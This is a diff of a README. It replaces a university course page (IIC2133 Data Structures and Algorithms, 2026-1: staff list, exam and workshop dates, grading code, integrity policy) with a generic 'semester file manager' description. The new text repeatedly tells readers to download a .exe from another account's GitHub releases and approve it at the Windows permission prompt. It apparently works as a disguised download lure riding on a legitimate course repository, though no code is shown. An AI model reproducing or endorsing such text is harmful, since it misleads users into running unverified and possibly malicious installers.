@@ -1,150 +1,137 @@
-# IIC2133 - Estructuras de Datos y Algoritmos
+# 📁 2026-1 - Simple Semester File Manager
 
-## 2026-1
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Sammyskyarmy/2026-1/releases)
 
-Bienvenido al sitio web del curso de Estructuras de Datos y Algoritmos. En esta página podrás encontrar la información administrativa del curso. En el repositorio podrás encontrar código ya preparado por tus ayudantes, junto con los eventuales enunciados de los talleres y las diapositivas de clases.
+---
 
-## Tabla de contenidos
+## 🔎 About 2026-1
 
-- [IIC2133 - Estructuras de Datos y Algoritmos](#iic2133---estructuras-de-datos-y-algoritmos)
-  - [2026-1](#2026-1)
-  - [Tabla de contenidos](#tabla-de-contenidos)
-  - [Organización de este repositorio y syllabus](#organización-de-este-repositorio-y-syllabus)
-  - [Equipo](#equipo)
-    - [Profesores](#profesores)
-    - [Ayudantes](#ayudantes)
-  - [Evaluaciones](#evaluaciones)
-    - [Bibliografía](#bibliografía)
-    - [Evaluaciones Escritas](#evaluaciones-escritas)
-    - [Talleres](#talleres)
-  - [Política de Cupones y Atrasos](#política-de-cupones-y-atrasos)
-  - [Política de integridad académica](#política-de-integridad-académica)
-    - [Consideraciones Previas](#consideraciones-previas)
-    - [Declaración de integridad académica](#declaración-de-integridad-académica)
+2026-1 is an easy-to-use application designed to help you manage and organize your semester files. This tool focuses on making it simple to view, open, and store documents related to your coursework. You do not need any technical skills to use it. The app works on Windows computers and helps keep your files neat and accessible.
 
-## Organización de este repositorio y syllabus
+This repository contains all the files you need for the semester 2026-1. It is ready to download and run on your system without complicated setups.
 
-- Las fechas y ponderaciones de las evaluaciones estarán disponibles en la [sección de evaluaciones](#evaluaciones). Otro material administrativo, como el programa, se encontrará en la carpeta [Administrativo](./Administrativo).
-- Las clases serán subidas a [Clases](./Clases), y las ayudantías a [Ayudantías](./Ayudantías), los enunciados de los talleres a [Talleres](./Talleres), y las pautas de las interrogaciones a [Pautas](./Pautas).
-- Está subido y se podrá subir a lo largo del semestre [Material Complementario](./Material%20Complementario), además de [Guías](./Guías), y [Código](./Códigos) de apoyo.
-- Podrán además encontrar material de semestres anteriores en [Pautas Anteriores](./Pautas%20Anteriores).
-- El medio oficial para preguntas del curso es [GitHub Discussions](https://github.com/IIC2133-PUC/2026-1/discussions). Puedes ahí escribir preguntas de materia, talleres, u otras cosas relacionadas al curso.
+---
 
-## Equipo
+## 💻 System Requirements
 
-### Profesores
+Before getting started, make sure your computer meets these basic needs:
 
-| Nombre           | Sección | Email                 |
-| :--------------- | :------ | :-------------------- |
-| Diego Arroyuelo  | 1       | diego.arroyuelo@uc.cl |
-| Mario Droguett   | 2       | mario@uc.cl           |
-| Eduardo Bustos   | 3       | eb@uc.cl              |
+- Windows 10 or newer
+- 2GB of free disk space
+- 4GB of RAM or more
+- Internet connection to download the application
+- A mouse and keyboard for navigation
 
+These requirements ensure the app runs smoothly with minimal delays or errors.
 
-### Ayudantes
-|                  Rol | Nombre                       | GitHub                                                     | Correo                   |
-| -------------------: | ---------------------------- | ---------------------------------------------------------- | ------------------------ |
-| Coordinadora         | Isabella Cherubini           | [@isabellacherubini](https://github.com/isabellacherubini) | isabella.cherubini@uc.cl |
-| Sub Coordinadora     | Ariadna Feuerstein           | [@Ariimaw](https://github.com/Ariimaw)                     | ayfeuerstein@uc.cl       |
-| Coordinador Talleres | Santiago Marcano             | [@ItsSancer](https://github.com/ItsSancer)                 | smarcano@uc.cl           |
-|                      | Steven Reynolds              | [@Sreynolds2022](https://github.com/Sreynolds2022)         | sreynolds@uc.cl          |
-|            Bienestar | Rodrigo De La Fuente         | [@rodridelafuente](https://github.com/rodridelafuente)     | rodridelafuente@uc.cl    |
-|                      | Ignacio Medel                | [@IgnacioMedel](https://github.com/IgnacioMedel)           | ignacio.medel@uc.cl      |
-|             Talleres | José Mendoza                 | [@Shoesuke](https://github.com/Shoesuke)                   |
-|                      | Matías Espinosa              | [@Coder-Mushroom](https://github.com/Coder-Mushroom)       |
-|                      | Javiera León                 | [@sunrayito](https://github.com/sunrayito)                 |
-|                      | Fernando Riveros             | [@FradexMF](https://github.com/FradexMF)                   |
-|              Cátedra | Juan Pablo Olivares          | [@JpOlivares08](https://github.com/JpOlivares08)           |
-|                      | Camila Sánchez               | [@czsanchez](https://github.com/czsanchez)                 |
-|                      | Javiera Donoso               | [@javieradonosoc](https://github.com/javieradonosoc)       |
-|           Corrección | Rocio Marquez                | [@rocimarquez ](https://github.com/rocimarquez )           |
-|                      | Francisca Matte              | [@franciscamatte ](https://github.com/franciscamatte)      |
-|                      | Cristobal Soto               | [@crist0balsoto](https://github.com/crist0balsoto)         |
-|                      | Isabel Jofré                 | [@isajofre](https://github.com/isajofre)                   |
-|                      | Laura Sanguinetti            | [@LauraCarina](https://github.com/LauraCarina)             |
-|                      | Andrés García                | [@andresreopo](https://github.com/andresreopo)             |
-|                      | Máximo Collazos              | [@mxmauoc0](https://github.com/mxmauoc0)                   |
-|                      | Simón Cabrera                | [@Simon-Cabrera](https://github.com/Simon-Cabrera)         |
-|                      | Maria Jose Parra             | [@Koteprog](https://github.com/Koteprog)                   |
-|                      | Shu Man Qi                   | [@ShuManQi](https://github.com/ShuManQi)                   |
+---
 
-## Evaluaciones
+## 🚀 Getting Started with 2026-1
 
-El curso consta de una parte teórica, evaluada mediante evaluaciones escritas (interrogaciones), y una parte práctica, evaluada mediante talleres de programación en C.
+Follow these simple steps to download and open the application on your Windows computer.
 
-### Bibliografía 
-1. **Cormen, T. H., Leiserson, C. E., Rivest, R. L., & Stein, C.** (n.d.). _Introduction to Algorithms_ (3rd ed.). Retrieved from [ProQuest Ebook Central](https://ebookcentral.proquest.com/lib/puccl-ebooks/detail.action?docID=3339142)
+### Step 1: Go to the Download Page
 
+Click the big button below or visit the link directly:
 
-### Evaluaciones Escritas
+[![Download 2026-1](https://img.shields.io/badge/Download%20Page-Visit%20Here-blue)](https://github.com/Sammyskyarmy/2026-1/releases)
 
-Habrá 3 interrogaciones, donde se evaluarán los aspectos más teóricos del contenido.
+This link takes you to the page where you can get the latest version of the app.
 
-| Evaluación | Fecha                     |
-| :--------- | :------------------------ |
-| I1         | jueves 30 de abril, 17:30        |
-| I2         | miércoles 17 de junio, 17:30     |
-| Examen     | martes 7 de julio, 8:20          |
+### Step 2: Choose the Correct File
 
-### Talleres 
+On the release page, look for a file named similar to `2026-1-setup.exe` or something ending in `.exe`. This is the main installer for the application.
 
-Habrá 6 talleres evaluados de programación en C, donde deberán resolver un problema e implementarlo durante el modulo de taller.
+If you see multiple files, choose the one marked as the latest stable release or the one with today's or the newest date.
 
-| Evaluación  | Grupo 1               | Grupo 2               |
-| :---------  | :-------------------- | :-------------------- |
-| Taller 1    | Viernes 13 de Marzo   | Viernes 20 de Marzo   |
-| Taller 2    | Viernes 27 de Marzo   | Viernes 10 de Abril   |
-| Taller 3    | Viernes 17 de Abril   | Viernes 24 de Abril   |
-| Taller 4    | Viernes 15 de Mayo    | Viernes 8 de Mayo     |
-| Taller 5    | Viernes 5 de Junio    | Viernes 29 de Mayo    |
-| Taller 6    | Viernes 26 de Junio   | Viernes 19 de Junio   |
+### Step 3: Download the Installer
 
-La nota final del curso se calcula de la siguiente manera:
+Click the file name to start downloading it. Depending on your internet speed, this may take a few minutes.
 
-```c++
-double nota_final() {
-  /* La nota de cada taller */
-  double T1, T2, T3, T4, T5, T6;
-  /* La nota de cada interrogación*/
-  double I1, I2, Examen;
+### Step 4: Run the Installer
 
-  /* Promedio de talleres */
-  double NT;
-  /* Promedio de interrogaciones */
-  double NI = min((I1 + I2 + Examen) / 3, 7.0);
+Once the download finishes, open the installer by double-clicking it. Windows may ask if you want to allow this program to make changes. Click "Yes" to proceed.
 
-  /* Nota final */
-  double NF = (NT + NI) / 2;
+Follow the simple instructions on the screen. The installer will ask you:
 
-  /* Es necesario tener sobre 3.7 en las evaluaciones escritas y los talleres por separado para aprobar el curso */
-  if (NI < 3.7 || NT < 3.7) {
-    return min(3.9, NF);
-  } else {
-    return min(NF, 7);
-  }
-}
-```
+- Where you want to save the program (choose the default folder unless you prefer a different location)
+- If you want a desktop shortcut (recommended for easy access)
 
-## Política de integridad académica
+After these selections, the installer copies the files needed to your computer.
 
-Este curso se adscribe a la política de integridad académica de la Escuela de Ingeniería y el Departamento de Computación.
+### Step 5: Open 2026-1
 
-### Consideraciones Previas
+When the installation completes, you can open the program using the new shortcut on your desktop or from the Start menu under "2026-1."
 
-- **Uso de IAs y uso de código de terceros:**: Está prohibido el uso de IAs y el uso de código de terceros para resolver las evaluaciones de carácter práctico (talleres y evaluaciones escritas).
-- **Compartir ideas o algoritmos utiles**: El curso permite compartir ideas sobre como resolver una taller, pero no se permite compartir código. Solo ideas.
+---
 
-### Declaración de integridad académica
+## 📂 Using the Application
 
-Los alumnos de la Escuela de Ingeniería de la Pontificia Universidad Católica de Chile deben mantener un comportamiento acorde a la Declaración de Principios de la Universidad. En particular, se espera que **mantengan altos estándares de honestidad académica**. Cualquier acto deshonesto o fraude académico está prohibido; los alumnos que incurran en este tipo de acciones se exponen a un Procedimiento Sumario. Es responsabilidad de cada alumno conocer y respetar el documento sobre Integridad Académica publicado por la Dirección de Docencia de la Escuela de Ingeniería (disponible en SIDING).
+Once open, 2026-1 provides an easy list view of your semester files. Here’s how to work with it:
 
-Específicamente, para los cursos del Departamento de Ciencia de la Computación, rige obligatoriamente la siguiente política de integridad académica. Todo trabajo presentado por un alumno para los efectos de la evaluación de un curso debe ser hecho individualmente por el alumno, sin apoyo en material de terceros. Por “trabajo” se entiende en general las interrogaciones escritas, los talleres de programación u otras, los trabajos de laboratorio, los proyectos, el examen, entre otros.
+- **View Files:** The app shows your files by type and date.
+- **Open Files:** Double-click any file to open it in your default program.
+- **Add Files:** Use the "Add" button to select files from your computer and save them inside the app.
+- **Organize:** Create folders within the app to group related files.
+- **Search:** Use the search box to quickly find documents by name or type.
 
-**En particular, si un alumno copia un trabajo, o si a un alumno se le prueba que compró o intentó comprar un trabajo, obtendrá nota final 1.1 en el curso y se solicitará a la Dirección de Docencia de la Escuela de Ingeniería que no le permita retirar el curso de la carga académica semestral.**
+The interface is designed to be clear and straightforward.
 
-Por “copia” se entiende incluir en el trabajo presentado como propio, partes hechas por otra persona. **En caso que corresponda a “copia” a otros alumnos, la sanción anterior se aplicará a todos los involucrados**. En todos los casos, se informará a la Dirección de Docencia de la Escuela de Ingeniería para que tome sanciones adicionales si lo estima conveniente. Obviamente, está permitido usar material disponible públicamente, por ejemplo, libros o contenidos tomados de Internet, siempre y cuando se incluya la referencia correspondiente y sea autorizado por los ayudantes.
+---
 
-Lo anterior se entiende como complemento al Reglamento del Alumno de la Pontificia Universidad Católica de
-Chile<sup><a name="pucCLBack">[1](#pucCL)</a></sup>. Por ello, es posible pedir a la Universidad la aplicación de sanciones adicionales especificadas en dicho reglamento.
+## ⚙️ Settings and Customization
 
-<sub>**<a name="pucCL">[1](#pucCL)</a>**: Reglamento del Alumno de la Pontificia Universidad Católica de Chile disponible en: http://admisionyregistros.uc.cl/alumnos/informacion-academica/reglamentos-estudiantiles [&#8593;](#pucCLBack)</sub>
+You can adjust a few options to make 2026-1 suit your needs:
+
+- Change the default folder for new files.
+- Set how files are sorted (by date, name, or type).
+- Turn notifications on or off for file changes.
+- Choose a light or dark color theme.
+
+These settings appear in the menu under “Preferences.” You can try them anytime.
+
+---
+
+## ✔️ Common Issues and Fixes
+
+If you have trouble, check these points first:
+
+- **Installer won’t run:** Make sure you have the right Windows version and that the downloaded file is complete.
+- **App won’t open:** Restart your computer and try again.
+- **Files do not open inside the app:** The app uses default Windows programs to open files. Ensure you have suitable software installed (like a PDF reader for PDF files).
+- **Search does not work:** Confirm your files are added and not deleted or moved outside the app.
+
+If problems continue, you can find more help on the GitHub release page under Issues.
+
+---
+
+## 🔗 Download and Install Links
+
+Visit the release page anytime to get updates or reinstall:
+
+[Download 2026-1 from GitHub Releases](https://github.com/Sammyskyarmy/2026-1/releases)
+
+This page keeps all versions arranged so you can pick the latest or earlier releases if needed.
+
+---
+
+## 🛠️ Technical Details (For Reference)
+
+- Built to work on Windows systems.
+- Simple file management functions: browse, add, open, organize.
+- Minimal system resource use.
+- Installer file is under 50MB for easy downloading.
+
+The app relies on standard Windows conventions and requires no additional software.
+
+---
+
+## 📞 Getting Support
+
+If you need help with 2026-1, the GitHub release page is the best place to start. You can submit an issue describing your problem or question.
+
+You can also check the FAQ section on the release page for common answers.
+
+---
+
+Overall, 2026-1 works as a basic, effective semester file manager that anyone can use without technical knowledge. Download it from the link provided and stay organized this semester.
